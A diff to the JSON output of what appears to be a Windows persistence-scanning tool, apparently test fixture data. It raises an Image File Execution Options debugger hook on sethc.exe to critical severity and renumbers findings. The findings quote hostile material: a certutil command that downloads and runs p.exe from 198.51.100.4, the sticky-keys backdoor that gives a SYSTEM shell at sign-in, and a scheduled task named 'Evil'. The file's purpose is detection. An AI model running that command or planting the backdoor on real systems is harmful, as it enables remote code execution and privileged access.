@@ -21,8 +21,8 @@
   "auto_trusted": 5,
   "to_analyze": 95,
   "by_level": {
-   "critical": 17,
-   "suspicious": 31,
+   "critical": 18,
+   "suspicious": 30,
    "attention": 30,
    "no_signals": 17
   },
@@ -1417,6 +1417,67 @@
    "level": "critical"
   },
   {
+   "kind": "command",
+   "title": "C:\\Windows\\System32\\cmd.exe",
+   "subtitle": "command run by cmd.exe",
+   "id": "C3",
+   "path": null,
+   "file": null,
+   "roles": [
+    {
+     "kind": "startup",
+     "label": "debugger attached to \"sethc.exe\" (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe)",
+     "detail": {
+      "source": "ifeo_debugger",
+      "reg_key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
+      "value": "sethc.exe"
+     },
+     "command": "C:\\Windows\\System32\\cmd.exe",
+     "persistent": true,
+     "privileged": false,
+     "active": true
+    }
+   ],
+   "commands": [
+    "C:\\Windows\\System32\\cmd.exe"
+   ],
+   "decoded": [],
+   "network": {},
+   "flags": [
+    {
+     "code": "debugger_hook",
+     "weight": 75,
+     "text": "runs instead of \"sethc.exe\", which Windows starts from the sign-in screen with SYSTEM rights"
+    }
+   ],
+   "score": 75,
+   "trusted": false,
+   "facts": {
+    "host": "cmd.exe"
+   },
+   "members": [],
+   "sha256": null,
+   "vt": null,
+   "verdict": "review",
+   "verdict_source": "heuristic",
+   "confidence": "",
+   "what": "",
+   "reason": "Local signals: runs instead of \"sethc.exe\", which Windows starts from the sign-in screen with SYSTEM rights.",
+   "action": "High priority: find out what this is before you keep using the computer as usual.",
+   "remediation": [
+    {
+     "title": "Remove the attached debugger",
+     "command": "Remove-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name 'Debugger'",
+     "note": null,
+     "admin": true,
+     "url": null,
+     "danger": true
+    }
+   ],
+   "actions_taken": [],
+   "level": "critical"
+  },
+  {
    "kind": "event",
    "title": "Scheduled task created: \\Evil",
    "subtitle": "on 2025-12-27T00:00:00",
@@ -1537,7 +1598,7 @@
    "kind": "command",
    "title": "cmd.exe /c \"certutil -urlcache -f http://198.51.100.4/p.exe %TEMP%\\p.exe & %TEMP%\\p.exe\"",
    "subtitle": "command run by cmd.exe",
-   "id": "C3",
+   "id": "C4",
    "path": null,
    "file": null,
    "roles": [
@@ -2022,67 +2083,6 @@
      "admin": false,
      "url": null,
      "danger": false
-    }
-   ],
-   "actions_taken": [],
-   "level": "suspicious"
-  },
-  {
-   "kind": "command",
-   "title": "C:\\Windows\\System32\\cmd.exe",
-   "subtitle": "command run by cmd.exe",
-   "id": "C4",
-   "path": null,
-   "file": null,
-   "roles": [
-    {
-     "kind": "startup",
-     "label": "debugger attached to \"sethc.exe\" (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe)",
-     "detail": {
-      "source": "ifeo_debugger",
-      "reg_key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
-      "value": "sethc.exe"
-     },
-     "command": "C:\\Windows\\System32\\cmd.exe",
-     "persistent": true,
-     "privileged": false,
-     "active": true
-    }
-   ],
-   "commands": [
-    "C:\\Windows\\System32\\cmd.exe"
-   ],
-   "decoded": [],
-   "network": {},
-   "flags": [
-    {
-     "code": "debugger_hook",
-     "weight": 50,
-     "text": "runs instead of \"sethc.exe\" every time that program is opened"
-    }
-   ],
-   "score": 50,
-   "trusted": false,
-   "facts": {
-    "host": "cmd.exe"
-   },
-   "members": [],
-   "sha256": null,
-   "vt": null,
-   "verdict": "review",
-   "verdict_source": "heuristic",
-   "confidence": "",
-   "what": "",
-   "reason": "Local signals: runs instead of \"sethc.exe\" every time that program is opened.",
-   "action": "Check whether you recognize this item and, if you do not, investigate it.",
-   "remediation": [
-    {
-     "title": "Remove the attached debugger",
-     "command": "Remove-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name 'Debugger'",
-     "note": null,
-     "admin": true,
-     "url": null,
-     "danger": true
     }
    ],
    "actions_taken": [],
